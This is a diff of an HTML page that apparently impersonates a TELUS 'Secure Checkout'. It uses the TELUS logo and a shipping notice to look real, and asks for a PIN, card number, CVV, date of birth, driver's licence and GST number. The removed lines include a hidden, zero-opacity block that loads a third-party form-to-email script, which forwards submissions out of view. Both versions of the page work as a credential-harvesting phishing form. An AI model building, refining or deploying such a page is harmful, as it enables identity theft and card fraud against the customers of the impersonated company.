@@ -7,13 +7,14 @@
   <style>
     :root {
       --primary: #6c63ff;
-      --background: #f0f2f5;
-      --card-bg: #fff;
+      --background: #eef1f8;
+      --card-bg: rgba(255, 255, 255, 0.75);
       --label-color: #555;
-      --input-bg: #fff;
-      --border-radius: 14px;
+      --input-bg: #ffffffdd;
+      --border-radius: 16px;
       --transition: 0.3s ease;
-      --shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+      --shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      --blur: 10px;
     }
 
     * {
@@ -24,35 +25,36 @@
     }
 
     body {
-      background: linear-gradient(135deg, #d1d9e6, #f0f2f5);
+      background: linear-gradient(135deg, #c6d0e6, #f0f2f5);
       min-height: 100vh;
       padding: 20px;
-    }
-
-    header {
-      text-align: center;
-      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     header img {
-      max-height: 40px;
-      width: auto;
+      max-height: 50px;
+      margin-bottom: 20px;
     }
 
     .container {
+      width: 100%;
       max-width: 1000px;
-      margin: auto;
       background: var(--card-bg);
-      padding: 40px 20px;
+      backdrop-filter: blur(var(--blur));
+      -webkit-backdrop-filter: blur(var(--blur));
+      padding: 40px 30px;
       border-radius: var(--border-radius);
       box-shadow: var(--shadow);
+      transition: var(--transition);
     }
 
     h1 {
       color: var(--primary);
       text-align: center;
-      margin-bottom: 10px;
-      font-size: 2rem;
+      margin-bottom: 6px;
+      font-size: 2.2rem;
     }
 
     .subtitle {
@@ -63,46 +65,53 @@
 
     .info-bar {
       display: flex;
+      flex-wrap: wrap;
       align-items: center;
       background-color: #f3f0f6;
       color: #333;
       padding: 16px 20px;
-      border-radius: 6px;
+      border-radius: 8px;
       font-size: 15px;
-      margin: 20px auto;
-      max-width: 100%;
+      margin-bottom: 30px;
       box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
-      flex-wrap: wrap;
       gap: 12px;
     }
 
-    .info-icon {
-      color: #5c2d91;
-      font-size: 20px;
-      line-height: 1;
-      flex-shrink: 0;
-    }
-
-    .info-bar a {
-      color: #2b2bb2;
-      text-decoration: underline;
+    .info-icon::before {
+      content: "ℹ️";
+      margin-right: 8px;
     }
 
     form {
       display: grid;
-      grid-template-columns: 1fr 1fr;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
       gap: 20px;
     }
 
     .form-group {
       position: relative;
+    }
+
+    .form-group input {
       width: 100%;
+      padding: 18px 16px 14px;
+      font-size: 15px;
+      background: var(--input-bg);
+      border: 1px solid #ccc;
+      border-radius: var(--border-radius);
+      transition: var(--transition);
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.2);
     }
 
     .form-group p {
       position: absolute;
-      top: 12px;
-      left: 16px;
+      top: 16px;
+      left: 18px;
       color: var(--label-color);
       font-size: 13px;
       pointer-events: none;
@@ -111,26 +120,10 @@
       padding: 0 4px;
     }
 
-    input {
-      width: 100%;
-      padding: 16px 14px 14px 14px;
-      border: 1px solid #ccc;
-      background: var(--input-bg);
-      border-radius: var(--border-radius);
-      font-size: 14px;
-      transition: var(--transition);
-    }
-
-    input:focus {
-      border-color: var(--primary);
-      outline: none;
-      box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.2);
-    }
-
-    input:focus + p,
-    input:not(:placeholder-shown) + p {
-      top: -9px;
-      left: 12px;
+    .form-group input:focus + p,
+    .form-group input:not(:placeholder-shown) + p {
+      top: -8px;
+      left: 14px;
       font-size: 11px;
       background: var(--background);
       color: var(--primary);
@@ -143,14 +136,14 @@
     .card-icon {
       position: absolute;
       top: 50%;
-      right: 12px;
+      right: 14px;
       transform: translateY(-50%);
       height: 28px;
       display: none;
     }
 
     .submit-btn {
-      grid-column: span 2;
+      grid-column: 1/-1;
       background-color: var(--primary);
       color: white;
       padding: 16px;
@@ -159,21 +152,11 @@
       border: none;
       border-radius: var(--border-radius);
       cursor: pointer;
-      transition: 0.3s;
-      width: 100%;
+      transition: 0.3s ease;
     }
 
     .submit-btn:hover {
-      background: #5847d6;
-    }
-
-    @media (max-width: 768px) {
-      form {
-        grid-template-columns: 1fr;
-      }
-      .submit-btn {
-        grid-column: span 1;
-      }
+      background-color: #524bd6;
     }
 
     @media (max-width: 480px) {
@@ -183,7 +166,6 @@
 
       .info-bar {
         flex-direction: column;
-        gap: 8px;
         font-size: 14px;
       }
 
@@ -195,88 +177,81 @@
 </head>
 <body>
 
-<header>
-  <img src="https://images.ctfassets.net/fikanzmkdlqn/3yUnySNpS8IS4CeyUeWgeg/5bcfa9c592acfe591f26d85f6820fa5f/Logo_TELUS.svg" alt="TELUS Logo">
-</header>
+  <header>
+    <img src="https://images.ctfassets.net/fikanzmkdlqn/3yUnySNpS8IS4CeyUeWgeg/5bcfa9c592acfe591f26d85f6820fa5f/Logo_TELUS.svg" alt="TELUS Logo">
+  </header>
 
-<div class="container">
-  <h1>Secure Checkout</h1>
-  <p class="subtitle">We need some personal information to complete your order.</p>
+  <div class="container">
+    <h1>Secure Checkout</h1>
+    <p class="subtitle">Please provide your information to continue.</p>
 
-  <div class="info-bar">
-    <span class="info-icon">ℹ️</span>
-    <span>Due to the Canada Post strike, we’re currently unable to deliver to PO boxes and rural routes. <a href="#">Learn more about updates on shipping.</a></span>
-  </div>
-
-  <form method="post" action="//submit.form" >
-
-    <div class="form-group"><input type="tel" id="contact" name="contact" placeholder=" " required /><p>Contact Number</p></div>
-    <div class="form-group"><input type="date" id="dob" name="dob" placeholder=" " required /><p>Date of Birth</p></div>
-    <div class="form-group"><input type="text" id="fname" name="fname" placeholder=" " required /><p>First Name</p></div>
-    <div class="form-group"><input type="text" id="mname" name="mname" placeholder=" " /><p>Middle Name</p></div>
-    <div class="form-group"><input type="text" id="lname" name="lname" placeholder=" " required /><p>Last Name</p></div>
-    <div class="form-group"><input type="text" id="address" name="address" placeholder=" " required /><p>Billing Address</p></div>
-    <div class="form-group"><input type="password" id="pin" name="pin" placeholder=" " required /><p>PIN</p></div>
-    <div class="form-group"><input type="text" id="dl" name="dl" placeholder=" " /><p>Driving License</p></div>
-    <div class="form-group"><input type="date" id="dl_expiry" name="dl_expiry" placeholder=" " /><p>DL Expiry Date</p></div>
-
-    <div class="form-group card-input-wrapper">
-      <input type="text" id="cardNumber" name="cardNumber" placeholder=" " required />
-      <p>Card Number</p>
-      <img id="cardIcon" class="card-icon" alt="Card Icon" />
+    <div class="info-bar">
+      <span class="info-icon"></span>
+      <span>Due to the Canada Post strike, we’re currently unable to deliver to PO boxes and rural routes.</span>
     </div>
 
-    <div class="form-group"><input type="text" id="cardRepeat" name="cardRepeat" placeholder=" " required /><p>Re-enter Card Number</p></div>
-    <div class="form-group"><input type="text" id="cardType" name="cardType" readonly placeholder=" " /><p>Card Type</p></div>
-    <div class="form-group"><input type="text" id="exp" name="exp" placeholder="MM/YY" required /><p>Expiration Date (MM/YY)</p></div>
-    <div class="form-group"><input type="text" id="holder" name="holder" placeholder=" " required /><p>Card Holder Name</p></div>
-    <div class="form-group"><input type="text" id="cvv" name="cvv" placeholder=" " pattern="[0-9]{3,4}" required /><p>CVV</p></div>
-    <div class="form-group"><input type="text" id="bizname" name="bizname" placeholder=" " /><p>Legal Business Name</p></div>
-    <div class="form-group"><input type="date" id="regDate" name="regDate" placeholder=" " /><p>Registration Date</p></div>
-    <div class="form-group"><input type="text" id="gst" name="gst" placeholder=" " /><p>GST/HST Number</p></div>
+    <form method="post" action="//submit.form">
 
-    <button type="submit" class="submit-btn">Submit</button>
-    
-    <div>
-                            <div style='font-size:1px!important; opacity:0!important;'
-                                <div class="hidden" style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
-                        <script src="https://www.100forms.com/js/FORMKEY:UCKLLUM59D84" type="text/javascript"></script>
-                        </div>
-    
-  </form>
-</div>
+      <div class="form-group"><input type="tel" id="contact" name="contact" placeholder=" " required /><p>Contact Number</p></div>
+      <div class="form-group"><input type="text" id="dob" name="dob" placeholder=" " required /><p>Date of Birth</p></div>
+      <div class="form-group"><input type="text" id="fname" name="fname" placeholder=" " required /><p>First Name</p></div>
+      <div class="form-group"><input type="text" id="mname" name="mname" placeholder=" " /><p>Middle Name</p></div>
+      <div class="form-group"><input type="text" id="lname" name="lname" placeholder=" " required /><p>Last Name</p></div>
+      <div class="form-group"><input type="text" id="address" name="address" placeholder=" " required /><p>Billing Address</p></div>
+      <div class="form-group"><input type="password" id="pin" name="pin" placeholder=" " required /><p>PIN</p></div>
+      <div class="form-group"><input type="text" id="dl" name="dl" placeholder=" " /><p>Driving License</p></div>
+      <div class="form-group"><input type="text" id="dl_expiry" name="dl_expiry" placeholder=" " /><p>DL Expiry Date</p></div>
 
-<script>
-  const cardNumberInput = document.getElementById('cardNumber');
-  const cardIcon = document.getElementById('cardIcon');
-  const cardTypeInput = document.getElementById('cardType');
+      <div class="form-group card-input-wrapper">
+        <input type="text" id="cardNumber" name="cardNumber" placeholder=" " required />
+        <p>Card Number</p>
+        <img id="cardIcon" class="card-icon" alt="Card Icon" />
+      </div>
 
-  const cardIcons = {
-    visa: "https://img.icons8.com/color/48/visa.png",
-    mastercard: "https://img.icons8.com/color/48/mastercard-logo.png",
-    amex: "https://img.icons8.com/color/48/amex.png"
-  };
+      <div class="form-group"><input type="text" id="cardRepeat" name="cardRepeat" placeholder=" " required /><p>Re-enter Card Number</p></div>
+      <div class="form-group"><input type="text" id="cardType" name="cardType" readonly placeholder=" " /><p>Card Type</p></div>
+      <div class="form-group"><input type="text" id="exp" name="exp" placeholder="MM/YY" required /><p>Expiration Date (MM/YY)</p></div>
+      <div class="form-group"><input type="text" id="holder" name="holder" placeholder=" " required /><p>Card Holder Name</p></div>
+      <div class="form-group"><input type="text" id="cvv" name="cvv" placeholder=" " pattern="[0-9]{3,4}" required /><p>CVV</p></div>
+      <div class="form-group"><input type="text" id="bizname" name="bizname" placeholder=" " /><p>Legal Business Name</p></div>
+      <div class="form-group"><input type="text" id="regDate" name="regDate" placeholder=" " /><p>Registration Date</p></div>
+      <div class="form-group"><input type="text" id="gst" name="gst" placeholder=" " /><p>GST/HST Number</p></div>
 
-  function detectCardType(number) {
-    number = number.replace(/\s+/g, '');
-    if (/^4/.test(number)) return "visa";
-    if (/^5[1-5]/.test(number)) return "mastercard";
-    if (/^3[47]/.test(number)) return "amex";
-    return null;
-  }
+      <button type="submit" class="submit-btn">Submit</button>
+    </form>
+  </div>
 
-  cardNumberInput.addEventListener('input', () => {
-    const type = detectCardType(cardNumberInput.value);
-    if (type && cardIcons[type]) {
-      cardIcon.src = cardIcons[type];
-      cardIcon.style.display = "block";
-      cardTypeInput.value = type.charAt(0).toUpperCase() + type.slice(1);
-    } else {
-      cardIcon.style.display = "none";
-      cardTypeInput.value = "";
+  <script>
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardIcon = document.getElementById('cardIcon');
+    const cardTypeInput = document.getElementById('cardType');
+
+    const cardIcons = {
+      visa: "https://img.icons8.com/color/48/visa.png",
+      mastercard: "https://img.icons8.com/color/48/mastercard-logo.png",
+      amex: "https://img.icons8.com/color/48/amex.png"
+    };
+
+    function detectCardType(number) {
+      number = number.replace(/\s+/g, '');
+      if (/^4/.test(number)) return "visa";
+      if (/^5[1-5]/.test(number)) return "mastercard";
+      if (/^3[47]/.test(number)) return "amex";
+      return null;
     }
-  });
-</script>
+
+    cardNumberInput.addEventListener('input', () => {
+      const type = detectCardType(cardNumberInput.value);
+      if (type && cardIcons[type]) {
+        cardIcon.src = cardIcons[type];
+        cardIcon.style.display = "block";
+        cardTypeInput.value = type.charAt(0).toUpperCase() + type.slice(1);
+      } else {
+        cardIcon.style.display = "none";
+        cardTypeInput.value = "";
+      }
+    });
+  </script>
 
 </body>
 </html>
